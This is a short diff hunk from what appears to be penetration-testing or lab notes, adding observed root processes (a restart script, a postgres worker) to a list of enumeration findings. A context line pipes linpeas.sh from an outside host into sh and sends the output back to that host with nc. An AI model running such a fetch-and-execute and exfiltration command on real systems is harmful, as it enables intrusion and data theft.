@@ -106,6 +106,9 @@ curl 192.168.45.201:8888/linpeas.sh | sh | nc -q 0 192.168.45.201 9002
 /usr/sbin/sendmail -FCronDaemon elldllla: -FCronDaemon -1 -odi -oem -oi -t -f root
 
 /usr/bin/mongod -f /etc/mongod.conf
+
+bash /root/restart.sh
+postgres: autovacuum worker process openfire
 ```
 
 
